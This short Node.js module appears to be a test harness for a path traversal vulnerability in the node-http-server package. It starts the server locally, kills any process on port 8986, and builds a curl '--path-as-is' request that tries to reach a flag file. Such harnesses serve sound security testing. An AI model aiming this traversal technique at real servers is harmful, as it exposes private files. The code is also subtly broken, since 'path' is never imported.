function exploitFunction(payload) {
    const pkg = require("node-http-server");
    const fs = require("fs");
    const { exec } = require("child_process");

    let hostsFile = fs.readFileSync(path.resolve(__dirname, "../flag.html")).toString();

    try {
        exec("fuser -k 8986/tcp", () => {});
    } catch (e) {}

    pkg.deploy({
        port: 8986,
        root: __dirname,
    });

    return {
        attack_string: `curl -v --path-as-is "http://127.0.0.1:8986${payload}"`,
    };
}

module.exports = { exploitFunction };